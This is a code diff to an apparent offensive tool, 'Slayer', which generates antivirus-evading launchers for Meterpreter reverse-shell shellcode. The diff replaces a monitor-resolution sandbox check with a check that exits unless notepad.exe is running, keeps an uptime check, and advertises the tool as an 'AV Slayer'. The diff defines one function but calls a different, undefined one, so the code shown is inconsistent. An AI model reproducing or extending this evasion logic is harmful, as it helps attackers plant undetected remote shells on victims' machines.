@@ -32,38 +32,39 @@ def create_template():
     r'''#include <windows.h>
 #include <stdio.h>
 #include <iostream>
+#include <tlhelp32.h>
 #define MULTI_LINE_STRING(a) #a
 #pragma comment(linker, "/INCREMENTAL:YES")
 #pragma comment(lib, "user32.lib")
 #define WIN32_LEAN_AND_MEAN
 
-bool CALLBACK MyCallback(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lpRect, LPARAM data)
-{
-	MONITORINFO monitorInfo;
-	monitorInfo.cbSize = sizeof(MONITORINFO);
-	GetMonitorInfoW(hMonitor, &monitorInfo);
-	int xResolution = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left;
-	int yResolution = monitorInfo.rcMonitor.top - monitorInfo.rcMonitor.bottom;
-	if (xResolution < 0) xResolution = -xResolution;
-	if (yResolution < 0) yResolution = -yResolution;
-	if ((xResolution != 1920 && xResolution != 2560 && xResolution != 1440)
-		|| (yResolution != 1080 && yResolution != 1200 && yResolution != 1600 && yResolution != 900))
-	{
-		*((BOOL*)data) = true;
-	}
-	return true;
+BOOL meptAndmerterpreterWasHere(CHAR *app) {
+    BOOL t0lg4 = FALSE;
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    if(Process32First(hSnap, &pe32)) {
+        do {
+            if(strcmp(pe32.szExeFile, app) == 0) {
+                t0lg4 = TRUE;
+                break;
+            }
+        } while(Process32Next(hSnap, &pe32));
+    }
+
+    CloseHandle(hSnap);
+
+    return t0lg4;
 }
 
 
 int main(int argc, char** argv)
 {
 
-	MONITORENUMPROC pMyCallback = (MONITORENUMPROC)MyCallback;
-	int xResolution = GetSystemMetrics(SM_CXSCREEN);
-	int yResolution = GetSystemMetrics(SM_CYSCREEN);
-	if ((xResolution < 1000 && yResolution < 1000)){
-	        ExitThread(0);
-	}else{ 
+	 if(!CheckRunningApp("notepad.exe")) {
+        printf("Notepad.exe not running this system is hostile.\n");
+    } else {
 	
 	ULONGLONG uptime = GetTickCount() / 1000;
 	if (uptime < 1200) return false;
@@ -164,7 +165,7 @@ banner ='''
 def main():
     print(banner)
     print("Additional options: -t for payload, -a for architecture, -p for port number, -i for IP address\n")
-    parser = argparse.ArgumentParser(description="Slayer: AV undetectable shellcode launcher generator", 
+    parser = argparse.ArgumentParser(description="Slayer: Undetected shellcode launcher generator, an AV Slayer..", 
     usage="slayer.py -t payload type -i IP address -p port number -a architecture \nExample: slayer.py -P windows/x64/meterpreter/reverse_tcp -i eth0 interface -p 4444 -a x64\n")
     parser.add_argument('-t', '--type', help="Define connection type eg. reverse_tcp, reverse_https, reverse_http", type=str, default="tcp")
     parser.add_argument('-i', '--ip', help="IP address for payload", type=str, default="eth0")
